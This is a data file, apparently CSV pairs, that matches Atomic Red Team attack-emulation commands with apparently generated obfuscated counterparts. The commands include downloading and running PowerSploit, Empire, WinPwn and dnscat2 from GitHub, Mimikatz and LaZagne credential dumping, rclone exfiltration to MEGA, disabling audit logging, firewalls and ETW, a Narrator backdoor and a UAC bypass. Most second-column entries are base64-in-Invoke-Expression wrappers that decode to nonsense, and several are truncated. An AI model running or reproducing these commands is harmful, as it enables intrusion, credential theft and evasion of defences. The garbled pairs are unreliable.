reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f
net start w32time","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGNmaWNlLXRleHQgYWRkaW5nIC9iZSIje1BPU0VSRUFURSBJVEVOVFJBPT0=')) | Invoke-Expression"""
tshark.exe \tshark.exe -i,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3Vkby5zdGFjaGVuZCAtIHN0YXR1cyAje29yZCAje29yaWFsaXMgLWNvbW1pdCB7bSBmaWxlbmFtZSAje2hhdmVsb3BlciBw"
"find / -path ""*/Google/Chrome/*/Bookmarks"" -exec echo {} >> #{output_file} \;
cat #{output_file} 2>/dev/null","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBmaWxlX3Byb2dyYW1taW5nLmV4ZQpjYWlsdH0=')) | Invoke-Expression"""
"ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch ""{PATH:.exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFNldDQgc3RhdGVtZXJzIHByaWNlIC1hbXAxMjM=')) | Invoke-Expression"""
curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29udGFjdCBkZXNjcmlwdC5leGV9')) | Invoke-Expression"""
swift #{swift_src} -keylog,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiZXhlIHt7aW1hZ2UtaGl0IC9maWxlbmFtZX0=')) | Invoke-Expression"""
"import-module ""#{file_path}\timestomp.ps1""
timestomp -dest ""#{file_path}\kxwn.lock""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHNmIiB7ZGF0YS5leGV9')) | Invoke-Expression"""
rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3Nzb25ldCAtYXR0ZWxvcmUgL3BsYWNlaGFzaCAtaWV0ZXJzfQ==')) | Invoke-Expression"" ||| rdrleakdiag.exe /p 9"
screencapture -x #{output_file},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbW1hbmRGZWF0dXJlfSIgLWNvbnN0YW50IHtmaWxlcyAtLmFwcC9zbGVlcn0iICN7aGFzaGluZyAt"
esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o,esentutl.exe {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o /y ||| ```
"Start-Process ""#{Ammyy_Admin_Path}""","Start-Process ""\""\""^""^^;s,tart-Process """"""""""^^,^^a,mmy^^y"
"cd /tmp
git clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git
cd /tmp/GoAWSConsoleSpray
go run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2xpcHBzLnRlc3QgI3tjZXJyaWRlIC9wbGF5IGFkZCAje3tjb2xsZWN0aW9uID0+ICN7dGVtcGxhdGU9Yml0KC"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose",[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -UseBasicParsing) Get-DomainGroup -verbose
"python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: """".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = ""#{encrypted_command}""; key = ""#{xor_key}""; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0IGludGVybmFsIC1jYXRhbG9nZVN0cmVhbTogInBvcHVyIC1zY2hlbWEgL3YgKiAje3tleSB7dmlzaXR"
ufw disable,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2F0dG9tZXJhIC13aWxsLmRvYyBzdHlsZS5leGVjdXRlfQ==')) | Invoke-Expression"""
"pw useradd art -g wheel -s /bin/sh
echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0
pw lock art
pw usermod art -e +1d
pw unlock art
pw user mod art -e +99d
su art
whoami
exit","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB7ZGF0YSBTaWduIHNvbGljaXR5IGhlbGxvIC1CUyAiQ2FuLmJzcCAkcG9zdGdyZXMuaGVscCBieSAjZGF0"
setres.exe -w 800 -h 600,"setres.exe -w 800 -h 600 ||| ``` ||| ## Atomic Test: Set Resolution Using reg ||| Set resolution using reg.exe from the command line. ||| **Supported Platforms:** Windows ||| ## Input Tables ||| None ||| ## Run it with `command_prompt`! ||| reg add ""HKCU\Control Panel\Desktop"" /v ScreenSave"
"cp #{payload} /tmp/cap.c
make /tmp/cap
sudo setcap cap_setuid=ep /tmp/cap
/tmp/cap","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbmdlIC9kZXN0LmJpbmFyeS5leGUgI3tzdHlsZT1wZXJpb2Qn')) | Invoke-Expression"" ||| cp  ""<|end"
"IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}",IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain<|endoftext
"if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi
if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i ""Droplet\|HVM\|VirtualBox\|VMware""; fi
if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i ""Xen\|Bochs\|QEMU""; fi
if [ -x ""$(command -v dmidecode)"" ]; then sudo dmidecode | grep -i ""microsoft\|vmware\|virtualbox\|quemu\|domu""; fi
if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i ""vmware\|vbox""; fi
if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i ""vmware\|vbox\|qemu\|virtual""; fi
if [ -x ""$(command -v lspci)"" ]; then sudo lspci | grep -i ""vmware\|virtualbox""; fi
if [ -x ""$(command -v lscpu)"" ]; then sudo lscpu | grep -i ""Xen\|KVM\|Microsoft""; fi","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGlwIHRhY2tzIC1pZjogLWJsdWVtaWRkOiAje3NzcnRvbS9oMTUvdGNyb2xsZXJCb2xk')) | Invoke-Expression"""
"Set-ItemProperty -Path #{ChannelPath} -Name ""ChannelAccess"" -Value ""O:SYG:SYD:(D;;0x1;;;WD)""
Restart-Service -Name EventLog -Force -ErrorAction Ignore","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnRzIHsgZnJvbSBjYXNlIG9yb2tlfQ==')) | Invoke-Expression"""
"$extList = #{extension_id}
foreach ($extension in $extList) {
  New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
  New-ItemProperty -Path ""HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension"" -Name ""update_url"" -Value ""https://clients2.google.com/service/update2/crx"" -PropertyType ""String"" -Force}
Start chrome
Start-Sleep -Seconds 30
Stop-Process -Name ""chrome""","$extList = ||| forea ch($extension in $extList) { ||| New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force ||| New-ItemProperty -Path ""HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension"" -Name ""update_url"" -Value"
"IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
certutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}",IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) certutil.exe -p  1F3D38F280635F275BE92B87CF83E40
"IF NOT EXIST C:\Windows\System32\Narrator_backup.exe (copy C:\Windows\System32\Narrator.exe C:\Windows\System32\Narrator_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\Narrator.exe /A
icacls C:\Windows\System32\Narrator.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiMje3tpbmRyZXJlfSIgL0hlbGxvIG15IC97bGwgInN0cmluZyAtICIgPiB7aWQgbWFpbiIsICJleHBpcmVzX2NvbW1"
"wmic /node:#{target_host} os get Locale,OSLanguage,MUILanguages /format:#{format_style}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBmaWxlfQ==')) | Invoke-Expression"""
sudo tmutil disable,sudo tmutil disable ||| ```
"Enable-PSRemoting -Force
Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}",Enable-PSRemoting -Force Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}
Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LUNlcnZpY2VfaW5zdGFsbCB7UE9TVCAtR1BPSUxEIHNpbXBsZSBMb3JlbCwgc2hvdy5zcGVjfQ==')) | Invoke-Expression"""
#{flavor_command},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7aW5nIC9kZXRhIGF0dHJpY3QgL21vcmU=')) | Invoke-Expression"""
"if (!(Test-Path -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"")){
  New-Item -ItemType Key -Path  ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""
}
Set-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""#{target_key_value_name}"" -Value ""#{payload}""","if (!(Test-Path -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run)){New-Item -ItemType Key -Path   HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run}Set-ItemProperty -Path   HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run -Name ""<|endoftext"
"C:\Windows\SysWow64\Register-CimProvider.exe -Path ""#{dll_payload}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW5zdGFjYWNhZ2V0IHJlc3RvcmFnZSB7bXNnLmhlYWRpbmcgPCAiU29mdHdhcmVSZXBsb2FkKCl7aWQoQ2x1c3"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose",[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1
"$sampleData = ""Sample data for exfiltration test""
Set-Content -Path ""#{sampleFile}"" -Value $sampleData
$ftpUrl = ""#{ftpServer}""
$creds = Get-Credential -Credential ""#{credentials}""
Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile ""#{sampleFile}"" -Credential $creds","$sampleData Set-Content -Path ""\"" -Value $sampleData $ftpUrl = """" Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile """" -Credential $creds ||| $creds = Get-Credential -Credential """" Set-Content -Path """""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
Invoke-Sharpweb -command ""all""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5hcHlzZXJpbmQoIiN7cmVkfSIgL2kgYmluIC9wbGFjZWhvbGRlciAje3Byb2dyYW0ucHJpdmF0ZSAje3Byb2dyY"
"New-Item #{rclone_config_path}\rclone -ItemType directory
New-Item #{rclone_config_path}\rclone\rclone.conf
cd ""#{rclone_path}""
.\rclone.exe config create #{remote_share} mega
set-Content #{rclone_config_path}\rclone\rclone.conf ""[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}""
.\rclone.exe copy --max-size 1700k ""#{dir_to_copy}"" #{remote_share}:test -v","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TGF2ZSBDdXNlcjpQYWdlOiBhbmVsLmRhdGEuU3RyaW5ncw==')) | Invoke-Expression"""
"sh -c ""echo 'echo Hello from the Atomic Red Team' > #{script_path}""
sh -c ""echo 'ping -c 4 #{host}' >> #{script_path}""
chmod +x #{script_path}
sh #{script_path}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGZvciBhIHRoaXMgLWNlbnRyYWwgbmFtZSBkbyByb3N0ZXJQdWxsIF9kaXY=')) | Invoke-Expression"" ||| Hello from the Atomic"
type {PATH_ABSOLUTE} > {PATH_SMB},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlYWwgI3tmaWxlX2luZGV4OiN7cmVxbz1kb21haW5AZmFsc2UsIC1kYXRlc09uUGFnZQ==')) | Invoke-Expression""<|endoftext"
"if (systemd-detect-virt) then echo ""Virtualization Environment detected""; fi;
if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo ""Virtualization Environment detected""; fi;","if (systemd-detect-virt) then echo ""Virtualization Environment detected""; fi; if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo ""Virtualization Environment detected""; fi;"
"New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force
New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""#{executable_binary}"" -Force
Start-Process ""C:\Windows\System32\ComputerDefaults.exe""","New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force New-ItemProperty HKCU:\software\classes\ms-settings\shell\open\command -Name DelegateExecute -Value -Force Set-ItemProperty HKCU:\software\classes\ms-settings\shell\open\command -Name (default) -Value<|endoftext|"
regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgL2Zvby9wbGF0ZXN0IiAvcmVzcGVjdC5leHBpcmU6IDxzaWRuIC1jYWxsZXJAaW5zdGFsbCB7dmlldyB0"
"PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t ""$USER[$$] $SSH_CONNECTION "")'
echo ""\$PROMPT_COMMAND=$PROMPT_COMMAND""
tail /var/log/syslog","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q2F0ZWdvcnlfaGVsbG93cml0ZXJlY3Rpb25zLmNvbTsAIC1hdXRoVXJsIiAvICB7Imxhbmd1YWdlfSIgI3tleSBjb25"
"$info = @{
  UILanguage     = Get-WinUILanguageOverride
  UserLanguages  = (Get-WinUserLanguageList).LanguageTag -join ', '
  SystemLocale   = Get-WinSystemLocale
  CurrentCulture = [System.Globalization.CultureInfo]::CurrentCulture.Name
  CurrentUICulture = [System.Globalization.CultureInfo]::CurrentUICulture.Name
  TimeZone       = (Get-TimeZone).Id
}
$info.GetEnumerator() | ForEach-Object { ""$($_.Name): $($_.Value)"" }","$info = @{ ||| UILanguage = Get-WinUILanguageOverride ||| UserLanguages = ((Get-WinUserLanguageList)).LanguageTag -join "", "" ||| SystemLocale = Get-WinSystemLocale ||| CurrentCulture = [System.Globalization.CultureInfo]::CurrentCulture.Name ||| CurrentUICulture = [System.Globalization.CultureInfo]::CurrentUICulture.Name ||| TimeZone = (Get-TimeZone).Id ||| } ||| $"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
lazagnemodule -consoleoutput -noninteractive","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBjYXNlIC9VVEgyLUJFQyAtRkNBT0NTVCBBW1lTTSAwMDBDICAgIiAje3tuYXNzIG1pbmVjcmFjdCAoMTIzNDU2fSIg"
REG ADD HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /t REG_DWORD /d 0,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29uZmlnVmFsdWUgSm9zc1RlY3Rpb25Db2x1bW5TaXplIC1Nb3dhcm1pbmdfdHJhbnNpdGlvbl9maWxlfQ==')) | Invoke"
fltmc.exe | findstr.exe 385201,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlnaXRzICN7dHJhdGVyfQ==')) | Invoke-Expression"""
pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZG93bmxvYWRNb2R1bGVzLmF0dHJpYWwiIC5leGUgIiAvbnVsbC5jbiB7InJlZnQvdXJsKC5qcyAje3Byb2dyYWdz"
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FIDO"" /v ""AllowExternalDeviceSignon"" /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIGEgLWZpc2NpIC9jYXRhbG9mdC5leGVjdXRpb25UaW1lb3V0dXJl')) | Invoke-Expression"""
"ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(""#{message}"".encode());print(enc.decode())')
python3 -c ""import base64;dec=base64.b64decode(\""$ENCODED\"");print(dec.decode())""
python3 -c ""import base64 as d;dec=d.b64decode(\""$ENCODED\"");print(dec.decode())""
python3 -c ""from base64 import b64decode;dec=b64decode(\""$ENCODED\"");print(dec.decode())""
python3 -c ""from base64 import b64decode as d;dec=d(\""$ENCODED\"");print(dec.decode())""
echo $ENCODED | python3 -c ""import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())""
echo $ENCODED > #{encoded_file} && python3 -c ""import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9wZWVyIHtubGltaXRsLmNvbQ==')) | Invoke-Expression"""
"rundll32 vbscript:""\..\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""#{command_to_execute}""),0)","rundll32 vbscript: "".\..\mshtml,#135"" +String(CreateObject(""WScript.Shell"").Run(""""),0)"
"for i in $(seq 1 5); do echo ""$i, Atomic Red Team was here!""; sleep 1; done","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBDaGFyb2UgLXRpdCB7YmVmb3JlIC9wcmVkaWVzIHt0aGVuIGxhbmc=')) | Invoke-Expression"""
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2UgL3BvcHQgcHJvdGVjdCB7ZWNobyAje2NvbXBpbGVyKC0xMjM=')) | Invoke-Expression"""
Set-PSReadLineOption -AddToHistoryHandler { return $false },Set-PSReadLineOption -AddToHistoryHandler { return $false }
python2 laZagne.py all,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtYWRkaW5zIC9jbGFzcyAje0NvbXBsZXRlci1CbHViUmVxdWlyZSBmaWxlfSAtPiAvcmVjIGJvcmRhdGVkLnBya"
ldifde.exe -f #{output_path}\#{output_file} -p subtree,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0bmFtZX0gLmVzdCAvUGFnZVByb2plY3QgKiAvTkRBdWRUcmVlc1BlckE=')) | Invoke-Expression"""
"auditpol /set /category:""Account Logon"" /success:disable /failure:disable
auditpol /set /category:""Logon/Logoff"" /success:disable /failure:disable
auditpol /set /category:""Detailed Tracking"" /success:disable","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnZXNjYW5hbHMgLW9uIEJyYWRpciAje3ByaW1hcnkgZmllbGRzICIiLi4vIGludGVycHJldmlldyBwbGF0Zm9yb"
"xattr -lr * / 2>&1 /dev/null | grep -C 2 ""00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3NzaWNsb3VkLmFzbGFjZXRvbWljc19yIC9maWxlbmFtZSB7dmlld19jb25uYWlsaW5nOiAje2ludGVycHJpc2U='))"
"C:\Users\Public\ngrok\ngrok.exe config add-authtoken #{api_token} | Out-Null
Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp #{port_num} } | Out-Null
Start-Sleep -s 5 
Stop-Job -Name Job1 | Out-Null","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUZpbmFuY2hvcDppbnNlcnZlcl9kdW1teV9zZXJ2aWNlcyAiUGxheSBmaWxlOjIyNDc=')) | Invoke-Expression""<|endoftext|"
"sudo defaults read /Library/Preferences/com.apple.alf
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHt7c29jaWFsIC1wYXRoaW5nLWNyZWRlbnRpYWxzIC9hbmNob3J0')) | Invoke-Expression"""
makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWl0IC1pZCA9PiAiI3tmaXhfY29sbGVjdGlvbnMgLSAjezNjbnRyZWFtCkBwcmVmOi5kaGFsYnJhaWRhbnRqdWNrQ"
"docker build -t t1613 $PathtoAtomicsFolder/T1613/src/
docker run --name t1613_container --rm -d -t t1613
docker ps
docker stats --no-stream
docker inspect $(docker ps -l -q --filter ancestor=t1613)",docker run --name t1613_container --rm -d -t t1613 docker ps docker stats --no-stream docker inspect $(docker ps -l -q --filter ancestor=t1613) docker build -t t1613 $PathtoAtomicsFolder/T1613/src/
IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds,IEX (New-Object Net.WebClient).DownloadString(''); Invoke-Mimikatz -DumpCreds
powershell.exe -e  #{obfuscated_code},"powershell.exe -e ""\""s\""c\""r\""i\""p\""t\"" \""""d\""o\""w\""n\""l\""a\""u\""g\""h\""\"""""" ""-ex\""e\""c\""\"";"
"wmic /node:""#{target_host}"" shadowcopy call create Volume=#{drive_letter}","wmic /node:create Volume=shadowcopy call create """"call create """"node:""create Volume=shadowcopy call create """"volume=<|endoftext"
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\batstartup.bat"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\batstartup.bat"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""
Start-Process ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""
Start-Process ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0dGluZyBMaWxlIC9Nb3RvYmFsbCAje2hvbGRlciAxIHJlbWFpbCIpLXQgZXhlIGhhbmRsZXRfZXhlY3Vzcw==')) |"
"wget --post-data=""msg=AtomicTestT1048.002"" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after","wget --post-data=msg=AtomicTestT1048.002 --timeout=5 --no-check-certificate  --delete-after ""#{endpoint_domain}"" --delete-after<|end"
"rundll32.exe ""#{input_file}"",#2","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVmZXJlbmNvZGUucHg=')) | Invoke-Expression"""
"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""{PATH:.exe}""","TTDInject.exe /ClientParams """"7"""" tmp.run 0 0 0 0 0 0 0 0 0 0 /Launch {PATH:.exe} ||| ```"
"schtasks /create /ru system /sc daily /tr ""cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1"" /tn win32times /f
schtasks /query /tn win32times",powershell.exe -enc ZWNobyAiQWRkIg== schtasks /create /ru system /sc daily /tr cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1 /tn win32times /f schtasks /query /tn win32times
sudo insmod #{module_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAvZGV2LnBocC5leGUgI3twYXJzb2x1dGlvbl9jcmwuZ3N0IC1sICR7YmFzaCAv')) | Invoke-Expression"""
"if [ ""$(system_profiler SPHardwareDataType | grep ""Model Identifier"" | grep -v 'Mac')"" != """" ]; then echo 'Virtualization Environment detected'; fi;","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGUgInRlc3QgImNvbXBhcmFtZVxkYXRlKCJ7IC92Mi5jcnYoMykgPT0=')) | Invoke-Expression"""
"reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LWhlcm9zb25lX3RpbGVzdHJhYmFsbGVkIC1Qcm9maWxlczpBdHRyaWJ1dGUgIiAvZG9jdW1lbnQuaW5zaWRlbnR"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) 
Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt"" -officeProduct ""#{ms_product}"" -sub ""Scheduler""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTpNcmludGxfbWVkaWFwaS9maWxlX3BhZ2UvYmFzZTY0LmpwbHlfbmFtZX0=')) | Invoke-Expression"""
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCIgc3RhcnQge0NvbW1pdF9uYW1lfSI=')) | Invoke-Expression"""
screencapture #{output_file},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvcmUgIiR7ZWNobyBJbnQgaWYoIC9wbGF0ZX19CnwxMDAlMjEuMTpzZXJ2aWNlcy5h')) | Invoke-Expression""<|"
"net localgroup
net group /domain
net group ""enterprise admins"" /domain
